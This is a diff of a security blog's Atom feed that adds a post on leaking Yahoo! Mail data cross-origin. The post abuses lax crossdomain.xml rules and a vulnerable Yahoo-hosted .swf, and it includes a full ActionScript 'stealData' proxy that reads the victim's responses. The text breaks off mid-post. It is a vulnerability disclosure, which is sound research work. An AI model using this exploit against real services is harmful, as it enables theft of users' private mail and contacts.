@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[Defined Misbehaviour]]></title>
-  <link href="http://JordanMilne.github.io/atom.xml" rel="self"/>
-  <link href="http://JordanMilne.github.io/"/>
-  <updated>2014-04-12T01:02:55-03:00</updated>
-  <id>http://JordanMilne.github.io/</id>
+  <link href="http://blog.saynotolinux.com/atom.xml" rel="self"/>
+  <link href="http://blog.saynotolinux.com/"/>
+  <updated>2014-12-09T20:51:24-04:00</updated>
+  <id>http://blog.saynotolinux.com/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
     
@@ -14,69 +14,471 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Spooky Sanitization Stories: Analyzing the XSS Flaw in Reddit Enhancement Suite]]></title>
-    <link href="http://JordanMilne.github.io/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw/"/>
-    <updated>2014-04-12T00:04:22-03:00</updated>
-    <id>http://JordanMilne.github.io/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw</id>
-    <content type="html"><![CDATA[<a name="TL.DR"></a>
+    <title type="html"><![CDATA[Leaking Yahoo! Mail CrossOrigin... Again]]></title>
+    <link href="http://blog.saynotolinux.com/blog/2014/12/09/leaking-yahoo-mail-cross-origin-again/"/>
+    <updated>2014-12-09T07:56:01-04:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2014/12/09/leaking-yahoo-mail-cross-origin-again</id>
+    <content type="html"><![CDATA[<p><em>This is a follow-up to another article about crossorigin mail theft on Yahoo! Mail using Flash. For a better understanding of the issue, you can read that here: <a href="http://blog.saynotolinux.com/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">http://blog.saynotolinux.com/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/</a></em></p>
+
 <h2>TL;DR</h2>
+
+<p>A .swf on Yahoo&rsquo;s CDN had a vulnerability that enabled crossorigin theft of the current user&rsquo;s contacts and mail. The configuration issue that allowed a .swf completely unrelated to Yahoo! Mail to do something like that still exists.</p>
+
+<h2>The Issue</h2>
+
+<p>So, in the last article we established that YMail&rsquo;s <code>crossdomain.xml</code> rules are incredibly lax:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;crossorigin-policy&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;*.yahoo.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;l.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;s.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'><span class="nt">&lt;/crossorigin-policy&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They allow .swfs on any subdomain of <code>yahoo.com</code> to read resources on YMail crossorigin. Last time we abused a crossorigin proxy on <code>hk.promotions.yahoo.com</code> to serve up our own .swf that would request pages from YMail and leak them back to us. The crossorigin proxy has since been patched, but the loose <code>crossdomain.xml</code> rules remain. Assuming there&rsquo;s no way for us to serve our own .swf through <code>yahoo.com</code> anymore, how can we exploit these rules without using MITM attacks? Well, we abuse vulnerabilities in .swfs that are <em>legitimately</em> hosted on subdomains of <code>yahoo.com</code>.</p>
+
+<p>Let&rsquo;s look for a .swf that will allow us to make arbitrary requests, and read the response. With a little searching we find a good candidate, <a href="https://sp.yimg.com/dv/i/izmo/engine/hotspotgallery/hotspotgallery.swf">hotspotgallery.swf</a>, related to a feature on Yahoo! Autos that gives 3D tours of cars. Normally it&rsquo;s served up on <code>sp.yimg.com</code>, which isn&rsquo;t a domain allowed by YMail&rsquo;s <code>crossdomain.xml</code>, but with a little finagling we find that the same .swf <a href="http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf">can also be accessed on img.autos.yahoo.com</a>.</p>
+
+<!--more-->
+
+
+<p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/hotspotgallery.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/hotspotgallery.png" width="640" height="480"></a></p>
+
+<p>Let&rsquo;s take a peek at <a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">the ActionScript from the decompiler</a> to see why this .swf is useful to us:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// ... snip</span>
+</span><span class='line'>  <span class="kd">function</span> <span class="nx">frame1</span><span class="p">(){</span>
+</span><span class='line'>      <span class="nb">Security</span><span class="p">.</span><span class="nx">allowDomain</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="c1">// ... snip</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>
+
+<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">exteriorXML</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">DATA3</span><span class="o">:</span><span class="nb">XML</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">dataPath</span><span class="o">;</span>
+</span><span class='line'>  <span class="c1">// ... snip</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">loadXML2</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
+</span><span class='line'>        <span class="k">var</span> <span class="nx">ldr</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span><span class='line'>        <span class="k">var</span> <span class="nx">loader_IO_ERROR</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span><span class='line'>        <span class="k">var</span> <span class="nx">ldrEventHandler</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span><span class='line'>        <span class="nx">loader_IO_ERROR</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
+</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>        <span class="nx">ldrEventHandler</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
+</span><span class='line'>            <span class="nx">DATA3</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">XML</span><span class="p">(</span><span class="nx">_arg1</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+</span><span class='line'>            <span class="nx">temp</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">DATA3</span><span class="o">;</span>
+</span><span class='line'>            <span class="nx">loadAnim</span><span class="p">((</span><span class="nx">enginePath</span> <span class="o">+</span> <span class="s2">&quot;/angfront.swf&quot;</span><span class="p">)</span><span class="o">,</span> <span class="o">-</span><span class="mi">10</span><span class="o">,</span> <span class="o">-</span><span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>        <span class="nx">ldr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">URLLoader</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">try</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">ldr</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="nx">dataPath</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="nx">exteriorXML1</span><span class="p">));</span>
+</span><span class='line'>        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="o">:</span><span class="nb">SecurityError</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nf">trace</span><span class="p">(</span><span class="s2">&quot;A SecurityError has occurred.&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>        <span class="nx">ldr</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">IOErrorEvent</span><span class="p">.</span><span class="nx">IO_ERROR</span><span class="o">,</span> <span class="nx">loader_IO_ERROR</span><span class="p">);</span>
+</span><span class='line'>        <span class="nx">ldr</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">COMPLETE</span><span class="o">,</span> <span class="nx">ldrEventHandler</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="c1">// ... snip</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members, and can both read from <em>and</em> write to them from .swfs on our domain because they use the <code>public</code> access modifier, and the .swf&rsquo;s said anyone can access public members. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>
+
+<p>Well&hellip; with a few caveats:</p>
+
+<ul>
+<li>The target endpoint must respond to <code>GET</code>s</li>
+<li>If the response has angle brackets in it and it isn&rsquo;t syntactically correct XML, we probably can&rsquo;t get the response. The reason for that is the response is run through the XML constructor and it simply throws in the case of invalid XML. Luckily, Flash considers JSON without angle brackets to be valid XML and treats it as a single TextNode, so some JSON can still be leaked.</li>
+<li>We can&rsquo;t get the response if the status code is non-200 since this code only stores the response in the success case.</li>
+<li>The endpoint can&rsquo;t require an auth token we can&rsquo;t guess</li>
+</ul>
+
+
+<h2>First Steps</h2>
+
+<p>Let&rsquo;s make some ActionScript to embed and exploit <code>hotspotgallery.swf</code>. From here on you will need to be logged in to Yahoo! for some links to work. Here we&rsquo;ve got a very simple JS<->Flash proxy in the style of CrossXHR. It loads up the vulnerable .swf, sets its public members so it&rsquo;ll request the resource we want to leak, then returns the response back to JS:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">package</span> <span class="p">{</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">display</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">external</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">net</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">system</span><span class="p">.</span><span class="o">*;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nx">YahooFlasher</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Vulnerable SWF to make our requests through</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">PROXY_URL</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Get just the origin from a fully-qualified URL</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">ORIGIN_REGEX</span><span class="o">:</span><span class="nb">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">YahooFlasher</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="nx">onAdded</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">function</span> <span class="nx">onAdded</span><span class="p">(</span><span class="nx">e</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// Set timeout to avoid syncronous issues</span>
+</span><span class='line'>        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">available</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="c1">// Let&#39;s not make *ourselves* vulnerable to weird exploits.</span>
+</span><span class='line'>                <span class="k">var</span> <span class="nx">swfOrigin</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ORIGIN_REGEX</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">swfOrigin</span><span class="p">)</span> <span class="o">||</span> <span class="nx">swfOrigin</span> <span class="o">!=</span> <span class="nb">Security</span><span class="p">.</span><span class="nx">pageDomain</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="k">return</span><span class="o">;</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="nx">stealData</span><span class="p">);</span>
+</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>        <span class="p">}</span><span class="o">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">stealData</span><span class="p">(</span><span class="nx">targetURL</span><span class="o">:</span><span class="nb">String</span><span class="o">,</span> <span class="nx">callback</span><span class="o">:</span><span class="nb">String</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">///</span>
+</span><span class='line'>        <span class="c1">/// Steal data through the proxy SWF, response body must look like</span>
+</span><span class='line'>        <span class="c1">/// valid XML and status code must not be &gt;= 400.</span>
+</span><span class='line'>        <span class="c1">///</span>
+</span><span class='line'>        <span class="k">var</span> <span class="nx">ldrComplete</span><span class="o">:</span><span class="nb">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
+</span><span class='line'>                <span class="k">var</span> <span class="nx">proxyClip</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1">// This thing&#39;s all janked and the request will be made to dataPath + &quot;/&quot; + exteriorXML1.</span>
+</span><span class='line'>                <span class="c1">// Try to make it so that this won&#39;t affect our target.</span>
+</span><span class='line'>                <span class="k">var</span> <span class="nx">splitURL</span><span class="o">:</span><span class="nb">Array</span> <span class="o">=</span> <span class="nx">targetURL</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">dataPath</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">exteriorXML1</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1">// Triggers the HTTP Request through the vulnerable SWF</span>
+</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">loadXML2</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="k">var</span> <span class="nx">timeLimit</span><span class="o">:</span><span class="nb">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1">// Keep checking if the data&#39;s been loaded,</span>
+</span><span class='line'>                <span class="c1">// If `new XML(response)` raises, this will never be true,</span>
+</span><span class='line'>                <span class="c1">// the response has to look like valid XML, but most JSON</span>
+</span><span class='line'>                <span class="c1">// resources work too. Maybe because it sees it as one big </span>
+</span><span class='line'>                <span class="c1">// top-level TextNode?</span>
+</span><span class='line'>                <span class="kd">function</span> <span class="nx">checkFinished</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="k">var</span> <span class="nx">stolenXML</span><span class="o">:</span><span class="nb">XML</span> <span class="o">=</span> <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">DATA3</span><span class="o">;</span>
+</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                            <span class="k">var</span> <span class="nx">ret</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>                            <span class="c1">// If we get a simple node with no name, it&#39;s probably not even XML.</span>
+</span><span class='line'>                            <span class="c1">// Get the string representation without XML escaping.</span>
+</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span><span class="p">.</span><span class="nx">name</span><span class="p">()</span> <span class="o">||</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">hasComplexContent</span><span class="p">())</span>
+</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toXMLString</span><span class="p">();</span>
+</span><span class='line'>                            <span class="k">else</span>
+</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
+</span><span class='line'>                                <span class="c1">// Flash can&#39;t be trusted to serialize `ret` properly. Just encode it.</span>
+</span><span class='line'>                                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">ret</span><span class="p">));</span>
+</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                            <span class="c1">// Hit a timeout when trying to fetch the response. Either a non-200 status code</span>
+</span><span class='line'>                            <span class="c1">// was returned, or we couldn&#39;t parse the body as XML :(</span>
+</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">timeLimit</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
+</span><span class='line'>                                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="kc">null</span><span class="p">);</span>
+</span><span class='line'>                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="nx">checkFinished</span><span class="p">();</span>
+</span><span class='line'>                            <span class="p">}</span>
+</span><span class='line'>                        <span class="p">}</span>
+</span><span class='line'>                    <span class="p">}</span><span class="o">,</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="nx">checkFinished</span><span class="p">();</span>
+</span><span class='line'>            <span class="p">}</span><span class="o">,</span> <span class="mi">100</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">// Load up the vulnerable proxy SWF</span>
+</span><span class='line'>        <span class="k">var</span> <span class="nx">MCLoader</span><span class="o">:</span><span class="nb">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Loader</span><span class="p">();</span>
+</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="nx">PROXY_URL</span><span class="p">));</span>
+</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">contentLoaderInfo</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">COMPLETE</span><span class="o">,</span> <span class="nx">ldrComplete</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here comes the tricky part. We need to find interesting, leakable endpoints. We can&rsquo;t leak them if they return invalid XML (ruling out most webpages and JSON containing HTML fragments,) we can&rsquo;t leak them if they return a non-200 status code, and we can&rsquo;t leak them if they require an auth token we can&rsquo;t guess.</p>
+
